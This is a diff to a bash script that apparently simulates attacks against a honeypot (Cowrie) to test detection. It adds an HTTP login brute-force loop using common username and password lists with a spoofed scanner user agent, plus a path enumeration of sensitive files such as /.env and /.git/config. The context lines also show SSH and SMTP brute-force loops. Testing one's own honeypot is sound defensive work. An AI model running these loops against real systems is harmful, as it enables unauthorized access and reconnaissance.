@@ -301,7 +301,7 @@ attack_full_demo(){
     wait
     sleep 4
 
-    echo ""; log "Phase 4/5: SSH Brute Force on Cowrie (port 2222)..."
+    echo ""; log "Phase 5/6: SSH Brute Force on Cowrie (port 2222)..."
     for user in root admin ubuntu pi oracle guest; do
         for pass in password 123456 admin root toor letmein; do
             ssh -o StrictHostKeyChecking=no \
@@ -317,7 +317,7 @@ attack_full_demo(){
     wait
     sleep 4
 
-    echo ""; log "Phase 5/6: SMTP probe + brute force (port 25)..."
+    echo ""; log "Phase 5a/6: SMTP probe + brute force (port 25)..."
     for user in admin root postmaster; do
         for pass in password 123456 admin; do
             (
@@ -434,6 +434,44 @@ attack_smtp_normal(){
         echo "QUIT"
     ) | nc -w5 $TARGET 2525 2>/dev/null
     ok "Normal SMTP send done"
+}
+
+
+# ── ATTACK: HTTP login brute force ───────────────────────────
+attack_http_login_brute(){
+    log "HTTP login brute force → HTTP probe node + Rapid Connections"
+    USERS="admin root administrator user guest superuser operator"
+    PASSES="password 123456 admin admin123 root pass qwerty letmein"
+    for user in $USERS; do
+        for pass in $PASSES; do
+            curl -s -o /dev/null -w "%{http_code}" \
+                --connect-timeout 3 \
+                -X POST http://$TARGET/ \
+                -d "username=${user}&password=${pass}" \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                -H "User-Agent: Mozilla/5.0 zgrab/0.x" \
+                2>/dev/null &
+            sleep 0.1
+        done
+    done
+    wait
+    ok "HTTP login brute force done"
+}
+
+# ── ATTACK: HTTP path enumeration (admin panel hunting) ───────
+attack_http_enum(){
+    log "HTTP path enumeration → scanning for admin panels"
+    PATHS="/ /admin /login /wp-admin /phpmyadmin /.env /config /backup
+           /api/v1 /shell /manager /console /dashboard /administrator
+           /wp-login.php /xmlrpc.php /.git/config /server-status"
+    for path in $PATHS; do
+        curl -s -o /dev/null --connect-timeout 2 \
+            -H "User-Agent: Nikto/2.1.6" \
+            "http://$TARGET$path" 2>/dev/null &
+        sleep 0.15
+    done
+    wait
+    ok "HTTP enumeration done"
 }
 
 # ── MENU ─────────────────────────────────────────────────────
